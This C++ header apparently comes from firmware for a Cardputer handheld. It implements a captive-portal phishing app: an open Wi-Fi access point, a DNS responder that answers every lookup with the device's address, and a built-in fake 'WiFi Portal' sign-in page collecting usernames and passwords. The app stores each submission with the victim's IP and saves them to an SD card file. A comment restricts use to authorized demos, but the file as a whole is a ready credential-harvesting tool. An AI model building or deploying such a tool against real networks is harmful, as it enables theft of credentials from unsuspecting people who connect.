#pragma once
// CaptivePortalApp — Cardputer becomes an open SoftAP with an
// integrated DNS responder (returns our IP for any A query → the
// captive-portal popup fires on connecting clients) and a tiny
// HTTP server that serves a phishing page. Captured form bodies
// are stored in a small ring and persisted on Tab.
//
// LEGAL: STAGE-AND-DEMO USE ONLY. Capturing credentials from any
// device you don't own / don't have written authorization to test
// is wire-fraud / CFAA territory in the US and equivalent laws
// elsewhere. Yui's UI bakes "Use only on YOUR network" into every
// view of this app.
//
// The phishing template is configurable via NVS key `cp.html`; if
// absent, a generic-looking "WiFi Portal" page is used.
#include "yui/app/App.hpp"
#include "yui/hal/IWifiAp.hpp"
#include "yui/hal/IFs.hpp"
#include "yui/hal/IStorage.hpp"
#include "yui/types.hpp"
#include <cstdio>
#include <cstring>

#include "yui/ui/Chrome.hpp"
#include "yui/ui/Tokens.hpp"
namespace yui {

class CaptivePortalApp : public App {
public:
  enum class State : uint8_t { Idle, Starting, Running, Stopped };
  static constexpr size_t kMaxCaptures = 16;
  static constexpr size_t kHtmlCap = 1024;

  struct Capture {
    char peer_ip[16] = {0};
    char body[160]   = {0};
  };

  CaptivePortalApp(IWifiAp& ap, IFs& fs, IStorage& store)
      : ap_(ap), fs_(fs), store_(store) {}

  const char* name() const override { return "CaptivePortal"; }
  Category    category() const override { return Category::WiFi; }

  void on_enter(Hal& hal) override {
    hal_   = &hal;
    state_ = State::Idle;
    capture_count_ = 0;
    load_html_();
    load_ssid_();
  }

  void on_exit() override {
    if (state_ == State::Running) ap_.stop();
    state_ = State::Stopped;
  }

  void on_key(KeyEvent k) override {
    if (!k.down) return;
    if (k.key == Key::Enter && k.fn) start_();
    else if (k.key == Key::Backspace) stop_();
    else if (k.key == Key::Tab) flush_to_sd_();
  }

  void render(IDisplay& d) override {
    d.clear(ui::kSurface);
    ui::Chrome::header(d, "Captive Portal");

    char line[40];
    int y = 22;
    std::snprintf(line, sizeof(line), "SSID: %s",
                  ssid_[0] ? ssid_ : "(none — set cp.ssid)");
    d.draw_text(8, y, line, ui::kOnSurface, ui::kSurface); y += 14;
    std::snprintf(line, sizeof(line), "State: %s",
                  state_ == State::Running ? "RUNNING"  :
                  state_ == State::Starting ? "starting" :
                  state_ == State::Stopped ? "stopped"  : "idle");
    d.draw_text(8, y, line,
                state_ == State::Running ? kJapanRedBright : ui::kOnSurface,
                ui::kSurface); y += 14;
    std::snprintf(line, sizeof(line), "Clients: %u  DNS: %u  HTTP: %u",
                  static_cast<unsigned>(ap_.client_count()),
                  static_cast<unsigned>(ap_.dns_queries()),
                  static_cast<unsigned>(ap_.http_requests()));
    d.draw_text(8, y, line, ui::kOnSurface, ui::kSurface); y += 14;
    std::snprintf(line, sizeof(line), "Captures: %u",
                  static_cast<unsigned>(capture_count_));
    d.draw_text(8, y, line, capture_count_ > 0 ? ui::kAccent : ui::kAccentDark,
                ui::kSurface);
    ui::Chrome::footer(d, "Fn+Enter:start Bksp:stop Tab:save");
    d.flush();
  }

  // Configuration / test hooks
  void set_ssid(const char* ssid) {
    if (!ssid) return;
    std::strncpy(ssid_, ssid, sizeof(ssid_) - 1);
    ssid_[sizeof(ssid_) - 1] = '\0';
  }
  State  state()         const { return state_; }
  size_t capture_count() const { return capture_count_; }
  const Capture& capture_at(size_t i) const { return captures_[i]; }

private:
  static void capture_thunk_(void* ctx, const char* peer_ip, const char* body) {
    static_cast<CaptivePortalApp*>(ctx)->on_capture_(peer_ip, body);
  }

  void on_capture_(const char* peer_ip, const char* body) {
    if (capture_count_ >= kMaxCaptures) return;
    Capture& c = captures_[capture_count_++];
    std::strncpy(c.peer_ip, peer_ip ? peer_ip : "?", sizeof(c.peer_ip) - 1);
    std::strncpy(c.body,    body    ? body    : "", sizeof(c.body) - 1);
  }

  void start_() {
    if (state_ == State::Running) return;
    if (ssid_[0] == 0) return;
    state_ = State::Starting;
    if (!ap_.start_open(ssid_, channel_)) { state_ = State::Stopped; return; }
    if (!ap_.start_captive(html_, &capture_thunk_, this)) {
      ap_.stop();
      state_ = State::Stopped;
      return;
    }
    state_ = State::Running;
  }

  void stop_() {
    if (state_ != State::Running && state_ != State::Starting) return;
    ap_.stop();
    state_ = State::Stopped;
  }

  void load_html_() {
    char buf[kHtmlCap] = {0};
    if (store_.get_str("cp.html", buf, sizeof(buf)) && buf[0]) {
      std::strncpy(html_, buf, sizeof(html_) - 1);
      html_[sizeof(html_) - 1] = '\0';
      return;
    }
    static const char kDefault[] =
      "<!doctype html><meta charset=utf-8><title>WiFi Portal</title>"
      "<form method=POST action=/login>"
      "<h2>Sign in to continue</h2>"
      "<input name=u placeholder=Username><br>"
      "<input name=p type=password placeholder=Password><br>"
      "<button>Sign in</button></form>";
    std::strncpy(html_, kDefault, sizeof(html_) - 1);
  }

  void load_ssid_() {
    char buf[33] = {0};
    if (store_.get_str("cp.ssid", buf, sizeof(buf)) && buf[0])
      set_ssid(buf);
  }

  void flush_to_sd_() {
    if (capture_count_ == 0) return;
    fs_.init();
    char path[40];
    std::snprintf(path, sizeof(path), "/captures.txt");
    char out[kHtmlCap];
    int off = 0;
    for (size_t i = 0; i < capture_count_; ++i) {
      off += std::snprintf(out + off, sizeof(out) - off,
                           "%s\t%s\n",
                           captures_[i].peer_ip,
                           captures_[i].body);
      if (off >= static_cast<int>(sizeof(out)) - 64) break;
    }
    fs_.write_all(path, out, static_cast<size_t>(off));
  }

  IWifiAp&    ap_;
  IFs&        fs_;
  IStorage&   store_;
  Hal*        hal_           = nullptr;
  State       state_         = State::Idle;
  uint8_t     channel_       = 6;
  char        ssid_[33]      = {0};
  char        html_[kHtmlCap] = {0};
  Capture     captures_[kMaxCaptures];
  size_t      capture_count_ = 0;
};

}  // namespace yui
